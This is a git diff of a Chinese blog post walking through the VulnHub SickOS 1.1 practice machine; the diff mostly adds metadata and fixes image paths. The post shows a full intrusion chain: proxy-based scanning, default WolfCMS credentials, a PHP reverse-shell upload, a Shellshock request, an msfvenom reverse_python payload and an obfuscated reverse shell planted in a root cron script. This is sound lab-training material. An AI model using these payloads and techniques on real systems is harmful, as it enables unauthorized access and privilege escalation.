@@ -1,3 +1,14 @@
+---
+title: Vulnhub SickOS 1.1 WriteUp
+published: 2026-05-20
+description: SickOS 1.1 是 VulnHub 平台上一台以渗透测试为主题的入门级靶机，整体难度适中。靶机的核心考察点在于对非常规端口服务（HTTP 代理）的识别与利用，以及 CMS 漏洞的挖掘和凭据复用提权。
+image: './img/header/SickOS-1.1.png'
+tags: ["Vulnhub", "Security","靶机", "writeup"]
+category: 'Security'
+draft: false
+lang: ''
+---
+
 # 前言
 
 ### 靶场介绍
@@ -16,15 +27,15 @@ SickOS 1.1 是 VulnHub 平台上一台以渗透测试为主题的入门级靶机
 
 ### 涉及工具
 
-- nmap
-- dirsearch
-- curl
+- Nmap
+- Dirsearch
+- cURL
 - nc
-- mysql
+- MySQL
 
 ### 思维导图
 
-![](./img/0x11-SickOS-1.1/SickOS-1_1_思维导图.png)
+![](./img/SickOS-1.1/SickOS-1_1_思维导图.png)
 
 
 ---
@@ -41,7 +52,7 @@ $ nmap -sT -p- --min-rate 10000 192.168.200.159 -oA ports
 
 开放端口：`22,3128,8080`
 
-![nmap端口扫描截图](./img/0x11-SickOS-1.1/image-20260513004644004.png)
+![nmap端口扫描截图](./img/SickOS-1.1/image-20260513004644004.png)
 
 扫描结果比较特殊，没有出现常见的 80 端口，反而出现了 3128 端口。查了一下，3128 是 Squid 代理服务的默认端口。
 
@@ -53,7 +64,15 @@ $ nmap -sT -p- --min-rate 10000 192.168.200.159 -oA ports
 $ nmap -sT -sV -sC -O -p22,3128,8080 192.168.200.159 -oA detail
 ```
 
-![nmap详细信息截图](./img/0x11-SickOS-1.1/image-20260513004651496.png)
+![nmap详细信息截图](./img/SickOS-1.1/image-20260513004651496.png)
+
+### 漏洞扫描
+
+```bash
+$ nmap --script=vuln -p22,3128,8080 192.168.200.159 -oA vuln
+```
+
+![nmap漏洞扫描截图](./img/SickOS-1.1/image-20260513004615270.png)
 
 ### UDP 扫描
 
@@ -63,7 +82,7 @@ TCP 服务侧探测到的内容较少，可利用价值有限，补充进行 UDP
 $ nmap -sU --top-ports 20 192.168.200.159 -oA udp
 ```
 
-![nmap udp 常见端口探测](./img/0x11-SickOS-1.1/image-20260513005039740.png)
+![nmap udp 常见端口探测](./img/SickOS-1.1/image-20260513005039740.png)
 
 提取开放端口后进行详细扫描：
 
@@ -71,21 +90,13 @@ $ nmap -sU --top-ports 20 192.168.200.159 -oA udp
 $ nmap -sU -sV -sC -O -p53,67,68,69,123,135,137,138,139,161,162,445,500,514,520,631,1434,1900,4500,49152 192.168.200.159 -oA detail_udp
 ```
 
-### 漏洞扫描
-
-```bash
-$ nmap --script=vuln -p22,3128,8080 192.168.200.159 -oA vuln
-```
-
-![nmap漏洞扫描截图](./img/0x11-SickOS-1.1/image-20260513004615270.png)
-
 
 
 ---
 
 ## 1.2 Web 探测
 
-又扫描到的3128端口也是一个web服务，直接访问 `http://192.168.200.159:3128/`，返回 squid/3.1.19 的错误页，无法正常浏览。
+由扫描到的 3128 端口也是一个 Web 服务，直接访问 `http://192.168.200.159:3128/`，返回 squid/3.1.19 的错误页，无法正常浏览。
 
 页面链接 URL 解码后内容如下：
 
@@ -100,7 +111,7 @@ ClientIP: 192.168.200.1
 HTTP Request:
 ```
 
-![访问3128端口的web服务](./img/0x11-SickOS-1.1/image-20260513131525318.png)
+![访问3128端口的web服务](./img/SickOS-1.1/image-20260513131525318.png)
 
 直接对 3128 端口进行目录扫描，没有找到有效内容：
 
@@ -108,13 +119,13 @@ HTTP Request:
 $ dirsearch -u 'http://192.168.200.159:3128'
 ```
 
-![dirsearch扫描结果-1](./img/0x11-SickOS-1.1/image-20260513134026893.png)
+![dirsearch扫描结果-1](./img/SickOS-1.1/image-20260513134026893.png)
 
 查阅资料后了解到，Squid 本身是一个代理服务器（参考：https://cloud.tencent.com/developer/article/2362188 ），这意味着可能需要通过它作为代理来访问靶机上的其他 Web 服务。在 Firefox 中配置代理指向 `192.168.200.159:3128` 后，果然成功访问到了原本无法直接访问的 Web 界面。
 
-![firefox修改代理](./img/0x11-SickOS-1.1/image-20260513134222037.png)
+![firefox修改代理](./img/SickOS-1.1/image-20260513134222037.png)
 
-![访问web端口成功](./img/0x11-SickOS-1.1/image-20260513134247978.png)
+![访问web端口成功](./img/SickOS-1.1/image-20260513134247978.png)
 
 通过代理再次进行目录扫描（使用 `--proxy` 参数指定代理地址）：
 
@@ -124,7 +135,7 @@ $ dirsearch -u 'http://192.168.200.159' --proxy='http://192.168.200.159:3128'
 [01:47:53] 200 -   58B  - /robots.txt    # <-- 关键发现
 ```
 
-![dirsearch扫描-2](./img/0x11-SickOS-1.1/image-20260513134825663.png)
+![dirsearch扫描-2](./img/SickOS-1.1/image-20260513134825663.png)
 
 > **补充：curl 配置代理方式**
 > ```bash
@@ -161,7 +172,7 @@ print "You may want to try my services"
 
 访问 `robot.txt` 泄露的网站路径， `http://192.168.200.159/wolfcms/`，是一个博客主页。页面底部标注了 WolfCMS，文章发布时间约为 2015 年，由此判断这是一个较老版本的 CMS，存在已知漏洞的可能性较高。
 
-![cms主页](./img/0x11-SickOS-1.1/image-20260513135102951.png)
+![cms主页](./img/SickOS-1.1/image-20260513135102951.png)
 
 搜索 WolfCMS 相关漏洞，找到 [Wolf CMS - Arbitrary File Upload / Execution](https://www.exploit-db.com/exploits/38000)，该漏洞允许在登录后台后上传任意文件并执行。利用路径为：
 
@@ -177,9 +188,9 @@ http://targetsite.com/wolfcms/public/hello.php
 
 访问后台登录页，简单尝试万能密码无效，转而查询 WolfCMS 的默认凭据，得到 `admin:admin`，尝试后登入成功。
 
-![cms后台登入界面](./img/0x11-SickOS-1.1/image-20260513141008448.png)
+![cms后台登入界面](./img/SickOS-1.1/image-20260513141008448.png)
 
-![后台登入成功](./img/0x11-SickOS-1.1/image-20260513141135963.png)
+![后台登入成功](./img/SickOS-1.1/image-20260513141135963.png)
 
 进入后台后，访问文件管理器：
 
@@ -187,19 +198,19 @@ http://targetsite.com/wolfcms/public/hello.php
 http://192.168.200.159/wolfcms/?/admin/plugin/file_manager/browse/
 ```
 
-![文件上传](./img/0x11-SickOS-1.1/image-20260513141347261.png)
+![文件上传](./img/SickOS-1.1/image-20260513141347261.png)
 
 先上传一张普通图片和一个 phpinfo 测试文件，验证上传功能是否正常。
 
-![上传文件](./img/0x11-SickOS-1.1/image-20260513141633473.png)
+![上传文件](./img/SickOS-1.1/image-20260513141633473.png)
 
 测试图片可以正常访问：`http://192.168.200.159/wolfcms/public/test.jpg`
 
-![上传图片地址测试](./img/0x11-SickOS-1.1/image-20260513141847182.png)
+![上传图片地址测试](./img/SickOS-1.1/image-20260513141847182.png)
 
 测试 PHP 文件可以正常执行：`http://192.168.200.159/wolfcms/public/test.php`
 
-![页面回显phpinfo测试](./img/0x11-SickOS-1.1/image-20260513142009209.png)
+![页面回显phpinfo测试](./img/SickOS-1.1/image-20260513142009209.png)
 
 上传路径确认、PHP 执行已验证，接下来上传反弹 Shell：
 
@@ -215,7 +226,7 @@ $ sudo nc -lvnp 4444
 
 访问 `http://192.168.200.159/wolfcms/public/shell.php` 触发代码执行，Kali 端成功接收到反弹连接：
 
-![nc反弹](./img/0x11-SickOS-1.1/image-20260513142421588.png)
+![nc反弹](./img/SickOS-1.1/image-20260513142421588.png)
 
 ---
 
@@ -290,13 +301,7 @@ www-data@SickOs:/$ find / -perm -u=s -type f 2>/dev/null
 /bin/ping
 ```
 
-以上路径均为常规系统文件，无明显可利用项。
-
-### 内核版本
-
-系统内核已在初始信息收集中确认：`Linux SickOs 3.11.0-15-generic`（2014 年），版本较旧，存在已知漏洞可能，但利用风险较高（可能导致系统崩溃）。
-
-以上四项检查均无可直接利用项，转向配置文件查找凭据方向。
+以上路径均为常规系统文件，无明显可利用项。转向配置文件查找凭据方向。
 
 ## 3.2 配置文件凭据提取
 
@@ -306,7 +311,7 @@ www-data@SickOs:/$ find / -perm -u=s -type f 2>/dev/null
 www-data@SickOs:/var/www/wolfcms$ find . -name "*conf*"
 ```
 
-![](./img/0x11-SickOS-1.1/image-20260513191228281.png)
+![](./img/SickOS-1.1/image-20260513191228281.png)
 
 在 `config.php` 中找到数据库连接配置，存有明文凭据：
 
@@ -325,7 +330,7 @@ www-data@SickOs:/var/www/wolfcms$ python -c 'import pty;pty.spawn("/bin/bash")'
 www-data@SickOs:/var/www/wolfcms$ mysql -uroot -pjohn@123
 ```
 
-![](./img/0x11-SickOS-1.1/image-20260513192150232.png)
+![](./img/SickOS-1.1/image-20260513192150232.png)
 
 查看 `wolf` 数据库的表结构：
 
@@ -353,7 +358,7 @@ mysql> show tables;
 15 rows in set (0.00 sec)
 ```
 
-重点关注了 `cron`、`permission`、`role`、`user` 这几个表，简单查看后没有发现可直接利用的信息，查看过后没有得到可用信息。
+重点关注了 `cron`、`permission`、`role`、`user` 这几个表，查看过后没有得到可用信息。
 
 ## 3.3 凭据复用与提权
 
@@ -373,11 +378,11 @@ $ ssh sickos@192.168.200.159
 # 密码：john@123
 ```
 
-![](./img/0x11-SickOS-1.1/image-20260513194804417.png)
+![](./img/SickOS-1.1/image-20260513194804417.png)
 
 密码复用成功，登录进来了。立刻检查 sudo 权限：
 
-![](./img/0x11-SickOS-1.1/image-20260513194900655.png)
+![](./img/SickOS-1.1/image-20260513194900655.png)
 
 `sickos` 用户拥有完整的 sudo 权限（ALL:ALL），直接切换 root：
 
@@ -385,7 +390,7 @@ $ ssh sickos@192.168.200.159
 sickos@SickOs:~$ sudo su
 ```
 
-![rootshell](./img/0x11-SickOS-1.1/image-20260513194926135.png)
+![rootshell](./img/SickOS-1.1/image-20260513194926135.png)
 
 成功获取 root shell。
 
@@ -393,11 +398,11 @@ sickos@SickOs:~$ sudo su
 
 # 4.总结
 
-两个失败点，一个是浏览器搜索到`Squid`是代理服务，但完全没有想到访问web要通过代理去访问。
+两个失败点，一个是浏览器搜索到 `Squid` 是代理服务，但完全没有想到访问 web 要通过代理去访问。
 
-提权又失败了，猜到config里的配置可能有用，但是只尝试了root没有尝试多余的用户
+提权又失败了，猜到 config 里的配置可能有用，但是只尝试了 root 没有尝试多余的用户
 
-尤其是还是除去root外唯一一个不是服务的账户我给漏掉了。
+尤其是还是除去 root 外唯一一个不是服务的账户我给漏掉了。
 
 甚至想着用内核去提权，导致把系统搞崩溃。
 
@@ -414,9 +419,9 @@ sickos@SickOs:~$ sudo su
 $ sudo nikto -h 192.168.200.159 -useproxy http://192.168.200.159:3128
 ```
 
-![nikto_扫描结果](./img/0x11-SickOS-1.1/image-20260518194217081.png)
+![nikto_扫描结果](./img/SickOS-1.1/image-20260518194217081.png)
 
-> shellhock是什么？
+> Shellshock 是什么？
 - https://fdlucifer.github.io/2020/04/02/shellshock-exploitation/
 - https://en.wikipedia.org/wiki/Shellshock_(software_bug)
 
@@ -503,9 +508,9 @@ curl --proxy http://192.168.200.159:3128 \
   http://192.168.200.159/cgi-bin/status
 ```
 
-![发送payload](./img/0x11-SickOS-1.1/image-20260518201248009.png)
+![发送payload](./img/SickOS-1.1/image-20260518201248009.png)
 
-![kali_nc截图_webshell](./img/0x11-SickOS-1.1/image-20260518201305483.png)
+![kali_nc截图_webshell](./img/SickOS-1.1/image-20260518201305483.png)
 
 ---
 
@@ -528,7 +533,7 @@ www-data@SickOs:/etc$ cat cron.d/automate
 
 每分钟 root 会执行 `/var/www/connect.py`，而该文件 www-data 可写。
 
-> Linux 计划任务详解参考：[0x005-Linux 计划任务详解](0x005-Linux%20计划任务详解.md)
+> Linux 计划任务详解参考：0x005-Linux 计划任务详解
 
 ---
 
@@ -538,7 +543,7 @@ www-data@SickOs:/etc$ cat cron.d/automate
 $ sudo msfvenom -p cmd/unix/reverse_python Lhost=192.168.200.142 lport=4443 -f raw
 ```
 
-![msfvenom操作](./img/0x11-SickOS-1.1/image-20260519191130402.png)
+![msfvenom操作](./img/SickOS-1.1/image-20260519191130402.png)
 
 ---
 
@@ -553,11 +558,11 @@ exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('co
 EOF
 ```
 
-![webshell操作写入反弹shell](./img/0x11-SickOS-1.1/image-20260519191114603.png)
+![webshell操作写入反弹shell](./img/SickOS-1.1/image-20260519191114603.png)
 
 等待约 1 分钟，计划任务触发，收到 root shell：
 
-![rootshell](./img/0x11-SickOS-1.1/image-20260519193906749.png)
+![rootshell](./img/SickOS-1.1/image-20260519193906749.png)
 
 
 
